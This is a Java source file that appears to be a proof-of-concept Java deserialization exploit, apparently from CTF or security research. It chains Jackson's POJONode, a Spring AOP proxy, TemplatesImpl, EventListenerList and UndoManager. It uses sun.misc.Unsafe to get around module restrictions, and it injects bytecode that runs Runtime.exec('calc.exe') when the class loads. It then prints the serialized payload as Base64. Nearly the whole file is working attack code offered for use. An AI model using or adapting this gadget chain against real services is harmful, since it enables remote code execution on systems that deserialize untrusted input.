package com.test;

import javax.swing.event.EventListenerList;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import javax.swing.undo.UndoManager;
import java.util.Base64;
import java.util.Vector;
import java.util.ArrayList;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sun.misc.Unsafe;
import java.lang.reflect.Method;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import javax.xml.transform.Templates;
import java.lang.reflect.*;

// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED
public class OriginExp {
    public static void main(String[] args) throws Exception{
        // 删除writeReplace保证正常反序列化
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }

        // 把模块强行修改，切换成和目标类一样的 Module 对象
        ArrayList<Class> classes = new ArrayList<>();
        classes.add(TemplatesImpl.class);
        classes.add(POJONode.class);
        classes.add(EventListenerList.class);
        classes.add(OriginExp.class);
        classes.add(Field.class);
        classes.add(Method.class);
        new OriginExp().bypassModule(classes);

        // ===== EXP 构造 =====
        byte[] code1 = getTemplateCode();
        byte[] code2 = ClassPool.getDefault().makeClass("fushuling").toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_bytecodes", new byte[][]{code1, code2});
        setFieldValue(templates,"_transletIndex",0);

        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));

        EventListenerList eventListenerList = getEventListenerList(node);

        serialize(eventListenerList, true);
    }

    public static byte[] serialize(Object obj, boolean flag) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        return baos.toByteArray();
    }

    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public static byte[] getTemplateCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");
        String block = "Runtime.getRuntime().exec(\"calc.exe\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }

    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager undomanager = new UndoManager();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    private static Method getMethod(Class clazz, String methodName, Class[]
            params) {
        Method method = null;
        while (clazz!=null){
            try {
                method = clazz.getDeclaredMethod(methodName,params);
                break;
            }catch (NoSuchMethodException e){
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }
    private static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        return unsafe;
    }
    public void bypassModule(ArrayList<Class> classes){
        try {
            Unsafe unsafe = getUnsafe();
            Class currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new
                        Class[0]);
                if (getModuleMethod != null) {
                    for (Class aClass : classes) {
                        Object targetModule = getModuleMethod.invoke(aClass, new
                                Object[]{});
                        unsafe.getAndSetObject(currentClass,
                                unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                    }
                }
            }catch (Exception e) {
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}